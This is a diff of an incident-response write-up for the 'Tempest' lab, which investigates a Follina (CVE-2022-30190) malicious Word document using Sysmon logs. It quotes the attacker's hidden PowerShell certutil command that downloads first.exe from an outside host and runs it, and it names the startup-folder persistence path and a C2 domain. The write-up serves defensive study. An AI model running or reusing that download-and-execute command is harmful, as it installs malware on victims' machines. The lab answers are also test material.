@@ -1,4 +1,4 @@
-# Tempest Incident
+<img width="939" height="845" alt="image" src="https://github.com/user-attachments/assets/72f6efb5-c5e0-49e7-8270-1cac59f81396" /># Tempest Incident
 
 In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a CRITICAL severity that needs further investigation.
 
@@ -22,7 +22,7 @@ Significant Data Sources:
 
 ---
 
-# Part 1: Initial Access
+## Initial Access / Part 1 / Malicious Document
 
 I started by saving sysmon logs as CSV & XML so I can open them in Timeline Explorer and Sysmon View.
 
@@ -59,3 +59,58 @@ Jumping back into the event viewer I followed the chain of events that occurred 
 
 The command runs `msdt.exe` which is abused by attackers for Remote Code Execution under the CVE-2022-30190
 Otherwise known as Follina. This vulnerability allows attackers to use malicious word documents to invoke Microsoft Support Diagnostic Tool (MSDT) to gain RCE.
+
+---
+
+## Initial Access / Part 2 / Stage 2 Execution
+
+Based on the initial findings, we discovered that there is a stage 2 execution:
+
+    The document has successfully executed an encoded base64 command.
+    Decoding this string reveals the exact command chain executed by the malicious document.
+
+Investigation Guide
+
+With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:
+
+    The Autostart execution reflects explorer.exe as its parent process ID.
+    Child processes of explorer.exe within the event timeframe could be significant.
+    Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.
+
+### The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
+
+In the event viewer, shortly after the payload was executed, I found a process creation event for a `sdiaghost.exe`
+
+I then jumped back into the Sysmon View and investigated the .exe and found it wrote an update.zip file to the path `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
+
+<img width="939" height="845" alt="image" src="https://github.com/user-attachments/assets/90336d94-8199-4b74-a413-63c4206d4768" />
+
+### The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
+
+Inside of Sysmon View sitll, I decided to look into the powershell.exe to see if I could spot any executed commands or additional spawned processes. I discovered a suspicious process named ch.exe
+
+<img width="785" height="823" alt="image" src="https://github.com/user-attachments/assets/93853ed2-c3ea-425e-9cd9-9141bc2dfed7" />
+
+I then opened up ch.exe and found it spawned another process called first.exe - could this be it? I'll check it out
+
+<img width="399" height="599" alt="image" src="https://github.com/user-attachments/assets/902a1b78-ab26-412d-af4c-4b043b416091" />
+
+Looking into first.exe I found the powershell command in question 
+
+`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
+
+<img width="724" height="803" alt="image" src="https://github.com/user-attachments/assets/8bd28b81-a9f4-429b-937d-5f88db2bc5da" />
+
+Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
+
+The SHA256 hash is: `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`
+
+<img width="550" height="521" alt="image" src="https://github.com/user-attachments/assets/16ea22aa-c69e-44d1-acb1-d42526d39b0e" />
+
+### The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
+
+Back in the event viewer I investigated a DNS request that revealed a connection to the domain resolvecyber.xyz on port 80 (http)
+
+<img width="767" height="592" alt="image" src="https://github.com/user-attachments/assets/799c7a02-4242-4b8f-a142-8614b0163c87" />
+
+
